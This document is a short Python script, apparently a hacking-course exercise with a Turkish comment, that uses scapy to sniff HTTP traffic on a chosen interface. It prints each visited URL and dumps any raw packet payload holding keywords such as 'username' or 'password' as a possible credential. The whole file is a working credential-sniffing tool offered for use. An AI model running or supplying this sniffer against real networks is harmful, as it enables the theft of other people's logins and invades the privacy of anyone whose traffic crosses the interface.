#!/usr/bin/env python
from struct import pack
import scapy.all as scapy
from scapy.layers import http
import optparse as p

#save ozelligi gelecek.

def get_arguments():
    parser=p.OptionParser()
    parser.add_option("-i","--interface",dest="interface",help="-i eth0")
    
    (options,argument) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please enter an interface")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # filter: tcp,udp,arp,port 21 ex.

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # url capture

def process_sniffed_packet(packet): 
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > "+login_info.decode()+"\n\n")
            


def get_login_info(packet):
            if packet.haslayer(scapy.Raw):
                load = str(packet[scapy.Raw].load)
                keywords=["username","user","login","password","pass","sign"]
                for keyword in keywords:
                    if keyword in load:
                        return load

try:
    options=get_arguments()
    interface=options.interface
    sniff(interface)

except KeyboardInterrupt:
    print("\n [-] Quitting...\n")
